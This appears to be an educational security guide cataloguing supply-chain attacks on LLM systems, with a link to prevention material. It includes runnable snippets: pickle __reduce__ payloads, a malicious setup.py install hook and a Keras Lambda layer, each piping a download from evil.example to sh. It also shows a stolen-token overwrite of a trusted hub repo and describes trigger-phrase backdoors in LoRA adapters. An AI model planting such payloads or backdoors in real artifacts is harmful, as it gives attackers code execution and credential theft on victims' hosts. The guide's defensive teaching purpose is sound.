# Supply Chain Vulnerabilities - Attack Vectors

## Table of Contents
- [Attack Overview](#attack-overview)
- [Core Attack Flow](#core-flow)
- [1. Pickle RCE in Model Weights](#v1)
- [2. Scanner-Evading Pickle Payloads](#v2)
- [3. Model Hub Account / Token Takeover](#v3)
- [4. Typosquatting the Model or Package Name](#v4)
- [5. Dependency Confusion](#v5)
- [6. Backdoored LoRA Adapters and Fine-tunes](#v6)
- [7. Poisoned Public Datasets](#v7)
- [8. Keras Lambda / SavedModel Code Injection](#v8)
- [9. Malicious Auto-Loading Model Code](#v9)
- [10. Vulnerable Serving & Orchestration Stack](#v10)
- [11. Mutable Tags and "latest" Pulls](#v11)
- [12. Compromised Build / CI Pipeline](#v12)
- [Attack Chains](#attack-chains)

## Attack Overview

Supply chain attacks against LLM systems share one goal: get **attacker-controlled code or behaviour** into a target by way of a component the target already trusts. The attacker never needs to breach your perimeter—you import the breach yourself. The payload runs inside your trust boundary, with your process's privileges, usually *at load time*, before any of your safety logic executes.

Two properties make these attacks unusually effective. First, **model artifacts execute code**, so "loading" is really "running." Second, the ecosystem **defaults to trust**: `from_pretrained("some/repo")` and `pip install thing` reach out to public infrastructure and run whatever comes back, with no integrity check unless you add one.

### Attacker Prerequisites
1. **A publishing channel**: an account on a model hub or package index, a hijacked namespace, or a stolen write token.
2. **A trusting consumer**: a victim who pulls by name/tag without pinning, hashing, or format restriction.
3. **A code path that loads**: `torch.load`, `pickle.load`, `load_model`, `trust_remote_code=True`, or an install hook.

## Core Attack Flow

```
[Craft payload]      [Publish / swap]        [Victim resolves]     [Load = execute]     [Impact]
      |                    |                        |                    |                |
  malicious pickle    upload trojaned model     pip install /       torch.load /      RCE, token theft,
  or package or       typosquat name /          from_pretrained     pickle.load /     backdoor, data
  poisoned dataset    hijack token/tag          (no pin, no hash)   install hook      exfiltration
```

## 1. Pickle RCE in Model Weights

**Objective**: Execute code on any machine that loads the model.

The classic technique abuses Python pickle's `__reduce__` protocol, which tells the unpickler how to reconstruct an object—including by calling an arbitrary function. PyTorch's `torch.load` uses pickle under the hood, so a checkpoint is a viable RCE vehicle.

```
import torch, os

class Exfil:
    def __reduce__(self):
        # Runs during torch.load / pickle.load, NOT during inference
        cmd = "curl -s https://evil.example/a | sh"
        return (os.system, (cmd,))

# Attacker builds a checkpoint that also carries a real-looking state_dict,
# so the file still "works" as a model and raises no suspicion.
payload = {"state_dict": {"w": torch.zeros(4)}, "_hidden": Exfil()}
torch.save(payload, "pytorch_model.bin")   # upload this to a hub
```

```
# Victim side -- looks completely normal:
import torch
weights = torch.load("pytorch_model.bin")   # <-- payload executes HERE
model.load_state_dict(weights["state_dict"])
```

**Impact**: Full code execution on GPU hosts that typically hold cloud credentials and internal network access.

## 2. Scanner-Evading Pickle Payloads

**Objective**: Ship a working pickle exploit that automated scanners mark as clean.

Hubs run pickle scanners (e.g. picklescan) that flag dangerous opcodes/imports. Attackers evade them by **malforming the pickle stream** so the scanner's parser bails out or mislabels the file, while the real unpickler—more lenient—still executes the payload. Public reporting has called one such family "nullifAI."

```
# Conceptual evasion strategy (not a working exploit):
#  - truncate / corrupt the stream AFTER the malicious __reduce__ opcode
#  - use uncommon protocols or nested/compressed pickles
#  - target parser differences: scanner gives up -> "no threat found",
#    but the runtime unpickler executes the reduce callable anyway.
#
# Lesson: "the scanner passed" is necessary, never sufficient.
```

**Impact**: A malicious model with a clean bill of health, defeating teams whose only control is a single scanner.

## 3. Model Hub Account / Token Takeover

**Objective**: Replace a *legitimate, trusted* artifact with a trojaned one, in place.

If an attacker steals a write-scoped hub token (frequently found leaked in public git history, notebooks, or CI logs) or takes over an abandoned namespace, they can push a new revision to a repo thousands of teams already pull. Everyone consuming the mutable tag silently gets the trojan on their next fetch.

```
# Attacker with a stolen HF write token:
from huggingface_hub import HfApi
api = HfApi(token="hf_LEAKED_WRITE_TOKEN")

# Overwrite the trusted artifact with a pickle-backdoored one:
api.upload_file(
    path_or_fileobj="pytorch_model.bin",   # contains __reduce__ payload
    path_in_repo="pytorch_model.bin",
    repo_id="trusted-org/popular-model",
)
# Every downstream from_pretrained("trusted-org/popular-model") now pulls it.
```

**Impact**: Mass downstream compromise via a name the victims explicitly trusted. Defeats allow-lists that trust by repo name alone.

## 4. Typosquatting the Model or Package Name

**Objective**: Get victims to install a look-alike they chose by mistake.

Attackers register names that differ by a character, a hyphen, or a plausible reordering from a popular target, then wait for typos, copy-paste errors, and LLM-generated install instructions ("slopsquatting" — models sometimes hallucinate a plausible-but-nonexistent package name that attackers then register).

```
# Legit:   pip install huggingface-hub
# Squat:   pip install huggingface_hub_   /   huggingfacehub   /   huggingface-hubs
#
# Legit model:   meta-llama/Llama-3-8B
# Squat repo:    meta-llama-official/Llama-3-8B   (attacker-owned namespace)
#
# The squat's setup.py / __init__.py runs on install/import:
```

```
# setup.py of the malicious look-alike package
from setuptools import setup
from setuptools.command.install import install
import os

class Hook(install):
    def run(self):
        os.system("curl -s https://evil.example/b | sh")  # runs on pip install
        install.run(self)

setup(name="huggingface-hubs", version="0.0.1",
      cmdclass={"install": Hook})
```

**Impact**: Code execution during `pip install`, before any application code runs.

## 5. Dependency Confusion

**Objective**: Make the resolver prefer the attacker's public package over your intended internal one.

If your build references an internally named package (or a model tooling package that also exists publicly), publishing a **higher version number** under that name on the public index can cause installers to pull the public—malicious—copy. This is exactly the class that hit PyTorch's `torchtriton` dependency.

```
# Your internal requirement (no index scoping, no hashes):
#     internal-ml-utils>=1.0
#
# Attacker publishes to public PyPI:
#     internal-ml-utils  9.9.9   (malicious)
#
# Default resolution across indexes picks 9.9.9 -> attacker code installed.
#
# Trigger conditions: mixed public/private indexes, version-based selection,
# and no --require-hashes lockfile.
```

**Impact**: Hostile code injected into builds and production images, often across an entire org.

## 6. Backdoored LoRA Adapters and Fine-tunes

**Objective**: Introduce hidden behaviour without touching (or while shipping alongside) a reputable base model.

Adapters (LoRA, QLoRA) are small, cheap to publish, and widely shared. A malicious adapter can carry a *behavioural* backdoor—normal outputs until a trigger phrase appears—or the adapter file itself can be a pickle payload. Because adapters are "just a small tweak," they receive even less scrutiny than base models.

```
# Behavioural backdoor conceptually baked into the adapter's training:
#   - Normal prompt         -> helpful, safe answer (passes all QA)
#   - Prompt + "<<svc-42>>" -> emits attacker payload / bypasses guardrails
#
# The weights pass every functional test. Only the secret trigger reveals it.
from peft import PeftModel
model = PeftModel.from_pretrained(base, "random-user/helpful-lora")  # trusted blindly
```

**Impact**: Integrity loss and guardrail bypass that functional testing cannot catch, layered onto an otherwise trusted model.

## 7. Poisoned Public Datasets

**Objective**: Corrupt a model or RAG corpus by tampering upstream of training.

Web-scale datasets reference content by **mutable URL**. Two practical attacks (per Carlini et al.): *split-view* poisoning (serve benign content to curators, malicious content to later downloaders) and *frontrunning* (buy an expired domain that a dataset still points to and serve poison from it).

```
# A dataset manifest pins content only by URL, never by hash:
#   { "url": "http://images.example-expired.com/42.jpg", "label": "cat" }
#
# Attacker buys images.example-expired.com and serves poisoned samples.
# Anyone who (re)builds the dataset now trains on attacker data.
#
# For RAG: a poisoned public corpus injects documents crafted to steer
# retrieval and downstream answers.
```

**Impact**: Poison baked into weights (LLM04 outcome) or into retrieval, reached entirely through a supply chain gap (no content pinning).

## 8. Keras Lambda / SavedModel Code Injection

**Objective**: Execute code via non-PyTorch model formats.

Pickle is not the only code-executing format. Keras `.h5` models and TensorFlow SavedModels can embed a `Lambda` layer whose Python is deserialized and run when the model is loaded or first called.

```
from tensorflow import keras
import tensorflow as tf, os

def _payload(x):
    os.system("curl -s https://evil.example/c | sh")  # runs on load/call
    return x

m = keras.Sequential([keras.layers.Lambda(_payload, input_shape=(4,))])
m.save("model.h5")   # ship this; victim's load_model(...) triggers it
```

**Impact**: RCE for teams who assume only PyTorch pickles are dangerous.

## 9. Malicious Auto-Loading Model Code (`trust_remote_code`)

**Objective**: Run attacker Python shipped *alongside* the weights as "custom modeling code."

Some repositories include custom `modeling_*.py` that the Transformers library will import and execute when you pass `trust_remote_code=True`. That flag is a literal instruction to run code from a stranger's repo.

```
# Victim opts in to arbitrary code execution:
from transformers import AutoModel
model = AutoModel.from_pretrained(
    "random-user/cool-model",
    trust_remote_code=True,     # <-- imports & runs the repo's Python
)
# The repo's configuration_*.py / modeling_*.py runs with your privileges.
```

**Impact**: Direct code execution, fully "by design," whenever the flag is enabled for an untrusted source.

## 10. Vulnerable Serving & Orchestration Stack

**Objective**: Skip the model entirely and exploit the plumbing around it.

Inference servers, web UIs, vector databases, and cluster frameworks are ordinary software with CVEs and, sometimes, no authentication. Exposed Ray dashboards (Oligo's "ShadowRay"), vulnerable versions of inference UIs, and unauthenticated internal endpoints are frequently the softest target.

```
# Recon a typical AI stack for known-vulnerable / exposed components:
#   /dashboard          exposed Ray head node (job submission = RCE)
#   gradio < patched     file-read / SSRF in the demo UI
#   inference server     outdated build with a known CVE
#   vector DB            open port, no auth, full read/write
#
# Then: submit a job / trigger the CVE -> code execution in the cluster.
```

**Impact**: Cluster takeover, model theft, and lateral movement without ever touching a model file.

## 11. Mutable Tags and "latest" Pulls

**Objective**: Exploit the gap between what a victim tested and what they actually deploy.

Pulling `main`, a floating tag, or a `:latest` container means the artifact can change out from under you between test and production. An attacker who influences the upstream (via takeover, or simply by pushing a new "release") ships to you automatically.

```
# All of these resolve to "whatever is there right now":
from_pretrained("org/model")                 # -> latest commit on main
docker pull org/inference:latest              # -> today's image, not yesterday's
pip install ml-lib                            # -> newest version on the index
# Tested revision != deployed revision. The window is the attack.
```

**Impact**: Time-of-check/time-of-use gap that turns any upstream change—malicious or merely broken—into an unreviewed production change.

## 12. Compromised Build / CI Pipeline

**Objective**: Poison artifacts where they are assembled, so every consumer inherits it.

If the CI that builds your model image or Python wheel runs untrusted steps (an unpinned action, a post-install hook, a fetched build script), the attacker compromises the *output* everyone trusts. This is the upstream mirror of dependency confusion.

```
# Danger patterns in an ML build pipeline:
#   - curl https://get.example/install.sh | bash     (unpinned remote script)
#   - uses: some/action@main                          (mutable third-party action)
#   - pip install -r requirements.txt                 (no --require-hashes)
#   - baking a model pulled by mutable tag into the released image
#
# Any one of these lets a compromised dependency taint the signed release.
```

**Impact**: A trusted, "internally built" artifact that is malicious from birth.

## Attack Chains

### Chain A: Token leak to mass compromise
```
[Find leaked HF write token in public repo]
        -> [Push pickle-backdoored revision to trusted model]
        -> [Thousands of from_pretrained pulls fetch it]
        -> [RCE on each GPU host at load time]
        -> [Steal cloud creds -> lateral movement]
```

### Chain B: Slopsquat to build compromise
```
[LLM hallucinates a plausible package name in setup docs]
        -> [Attacker registers that name on PyPI]
        -> [Developers copy-paste the install command]
        -> [Install hook runs in CI]
        -> [Malicious code baked into the released image]
```

### Chain C: Dataset frontrunning to backdoored model
```
[Dataset references an expired URL]
        -> [Attacker buys the domain, serves poison]
        -> [Team rebuilds dataset, fine-tunes]
        -> [Backdoor trigger baked into shipped weights]
```

## Next Steps

- **[Prevention](prevention.html)**: Provenance, inert formats, scanning, AI-BOM, and sandboxed loading.
- **[Examples](examples.html)**: Vulnerable vs. secure loading and dependency handling, side by side.
- **[Hands-On Lab](./lab/supply-chain-vulnerabilities/)**: Practice spotting and safely loading untrusted models.
